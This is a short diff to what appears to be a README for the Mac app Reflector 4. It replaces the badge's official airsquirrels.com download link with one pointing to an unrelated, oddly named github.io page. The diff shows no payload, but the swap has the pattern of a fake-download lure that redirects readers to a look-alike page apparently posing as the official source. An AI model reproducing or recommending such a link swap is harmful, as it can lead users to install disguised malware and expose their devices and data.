@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get Reflector 4](https://img.shields.io/badge/Get_Reflector_4_for_Mac-blue?style=for-the-badge&logo=apple)](https://www.airsquirrels.com/reflector)
+[![Get Reflector 4](https://img.shields.io/badge/Get_Reflector_4_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/reflector)
 
 </div>
 
